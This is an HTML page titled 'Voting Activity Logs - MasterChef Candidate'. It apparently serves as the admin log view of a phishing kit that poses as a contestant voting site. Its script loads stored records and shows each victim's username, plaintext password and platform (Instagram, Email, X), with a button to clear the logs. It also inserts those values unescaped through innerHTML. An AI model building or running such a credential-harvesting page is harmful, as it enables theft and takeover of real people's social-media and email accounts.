<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activity Logs - MasterChef Candidate</title>
    <style>
        :root {
            --primary-blue: #2563eb;
            --text-main: #1f2937;
            --text-muted: #6b7280;
            --bg-gray: #f3f4f6;
            --border-color: #e5e7eb;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-gray);
            padding: 40px 20px;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .log-container {
            background: white;
            width: 100%;
            max-width: 800px;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .header {
            padding: 24px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        h1 { margin: 0; font-size: 1.25rem; color: var(--text-main); }
        
        .clear-btn {
            background: #ef4444;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            font-weight: bold;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        th {
            background-color: #f9fafb;
            color: var(--text-muted);
            font-size: 0.8rem;
            text-transform: uppercase;
            padding: 12px 24px;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 16px 24px;
            border-bottom: 1px solid var(--border-color);
            color: var(--text-main);
            font-size: 0.95rem;
        }

        tr:last-child td { border-bottom: none; }

        .platform-badge {
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: bold;
            color: white;
        }

        .empty-state {
            padding: 40px;
            text-align: center;
            color: var(--text-muted);
        }

        .nav-links { margin-top: 24px; }
        .nav-links a { color: var(--primary-blue); text-decoration: none; font-weight: 500; }
        .nav-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <div class="log-container">
        <div class="header">
            <h1>📋 Voting Activity Logs</h1>
            <button class="clear-btn" onclick="clearLogs()">Clear Logs</button>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Serial Number</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Platform</th>
                    <th>Date</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody id="log-table-body">
                </tbody>
        </table>
    </div>

    <div class="nav-links">
        <a href="index.html">← Back to Voting Page</a> | 
        <a href="admin.html">Go to Admin Dashboard</a>
    </div>

    <script>
        function loadLogs() {
            const tableBody = document.getElementById('log-table-body');
            // Fetch logs from localStorage
            const logs = JSON.parse(localStorage.getItem('voteLogs')) || [];

            // If empty, show a message
            if (logs.length === 0) {
                tableBody.innerHTML = `<tr><td colspan="5" class="empty-state">No votes have been recorded yet.</td></tr>`;
                return;
            }

            // Clear table before injecting
            tableBody.innerHTML = '';

            // Loop through logs and build rows
            logs.forEach(log => {
                // Determine badge color
                let badgeColor = '#000'; // Default black (X)
                if (log.platform === 'Instagram') badgeColor = '#059669';
                if (log.platform === 'Email') badgeColor = '#e11d48';

                const row = `
                    <tr>
                        <td><strong>${log.sn}</strong></td>
                        <td>${log.user}</td>
                        <td>${log.password}</td>
                        <td><span class="platform-badge" style="background: ${badgeColor}">${log.platform}</span></td>
                        <td>${log.date}</td>
                        <td>${log.time}</td>
                    </tr>
                `;
                tableBody.innerHTML += row;
            });
        }

        function clearLogs() {
            if(confirm("Are you sure you want to delete all activity logs?")) {
                localStorage.removeItem('voteLogs');
                loadLogs(); // Refresh the table
            }
        }

        // Run when page loads
        loadLogs();
    </script>

</body>
</html>
